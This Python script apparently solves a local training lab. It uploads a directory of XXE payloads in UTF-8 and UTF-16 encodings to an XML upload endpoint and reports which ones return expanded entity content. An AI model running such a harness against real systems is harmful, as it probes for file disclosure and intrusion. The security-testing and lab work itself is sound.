import requests
from os import listdir, path
from bs4 import BeautifulSoup
from termcolor import colored

def upload_file(sess, content, utf16=False):
    url = "http://localtest.me:80/level2"
    files = {
        'file': (
            'file.xml', 
            content.encode('utf16') if utf16 else content,  
            'text/xml'
            )
    }

    resp = sess.post(url, files=files)
    return resp


def create_session():
    sess = requests.Session()
    sess.verify = False
    return sess


def find_alert(soup):
    alert = soup.find("div", attrs={'role': 'alert'})
    return alert.string.strip() if alert else None


def find_foo(soup):
    foo = soup.find('h3')
    return foo.string.strip() if foo else None


if __name__ == '__main__':
    payloads_directory = 'xxe-payloads'
    payloads = listdir(payloads_directory)
    sess = create_session()

    for file in payloads:
        for utf16 in [False, True]:
            payload = path.join(payloads_directory, file)

            with open(payload, 'r') as infile:
                content = infile.read()

            try:
                resp = upload_file(sess, content, utf16=utf16)
            except requests.exceptions.ConnectionError:
                print(colored(payload, 'yellow'))
                continue

            soup = BeautifulSoup(resp.text, features="html.parser")
            alert = find_alert(soup)
            foo = find_foo(soup)

            utf = 'UTF-16' if utf16 else 'UTF-8'

            if foo:
                print(f'{payload} {utf}', colored(foo.split('\n')[0], 'red'), end='\n\n', sep=': ')
            elif alert:
                print(f'{payload} {utf}', colored(alert, 'yellow'), end='\n\n', sep=': ')
            else:
                print(f'{payload} {utf}', colored('not vulnerable', 'yellow'))
